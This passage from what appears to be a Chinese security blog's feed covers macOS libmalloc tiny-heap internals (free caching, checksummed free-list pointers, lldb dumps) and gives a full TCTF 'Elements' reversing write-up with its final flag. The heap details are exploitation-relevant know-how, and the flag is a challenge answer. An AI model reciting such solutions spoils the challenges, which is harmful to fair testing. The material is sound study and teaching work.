= tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-04-08T11:25:34.497Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" 